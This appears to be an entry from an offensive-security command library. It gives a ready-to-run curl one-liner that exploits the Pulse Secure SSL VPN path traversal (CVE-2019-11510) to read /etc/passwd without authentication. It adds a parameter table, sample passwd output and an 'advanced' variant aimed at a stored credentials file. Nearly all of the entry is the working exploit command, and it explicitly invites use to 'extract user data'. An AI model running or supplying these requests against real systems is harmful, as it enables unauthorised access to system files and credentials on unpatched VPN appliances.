---
id: cmd-curl-pulse-traversal
data: >-
  curl -i -k --path-as-is
  https://target-vpn.com/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
tags:
  - recon
  - exploitation
  - path-traversal
type: command
output: |-
  HTTP/1.1 200 OK
  Content-Type: text/plain

  root:x:0:0:root:/root:/bin/bash
  bin:x:1:1:bin:/bin:/sbin/nologin
  ...
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:17.747Z'
verified: false
validated: true
submitted: true
---
# curl-path-traversal-file-read-pulse-secure

## Command

```bash
curl -i -k --path-as-is https://target-vpn.com/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
```

## Description

This command exploits path traversal in Pulse Secure SSL VPN to read /etc/passwd pre-authentication via CVE-2019-11510. Use it to verify the vulnerability and extract user data.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-i` | Include HTTP response headers | Yes |
| `-k` | Skip SSL certificate verification | Yes |
| `--path-as-is` | Do not normalize path (preserve '../') | Yes |
| URL path | Target endpoint with traversal to file | Yes |

## Examples

### Basic Usage

```bash
curl -i -k --path-as-is https://target-vpn.com/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/
```

### Advanced Usage

```bash
curl -i -k --path-as-is https://target-vpn.com/dana-na/../dana/html5acc/guacamole/../../../../../../var/pulse-secure/creds.txt?/dana/html5acc/guacamole/
```

## Expected Output

HTTP headers followed by file contents, e.g., root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
nobody:x:99:99:Nobody:/:

## Related

- [[Related Procedure|procedures/Exploit-Pre-Auth-Arbitrary-File-Read-in-Pulse-Secure-SSL-VPN]]
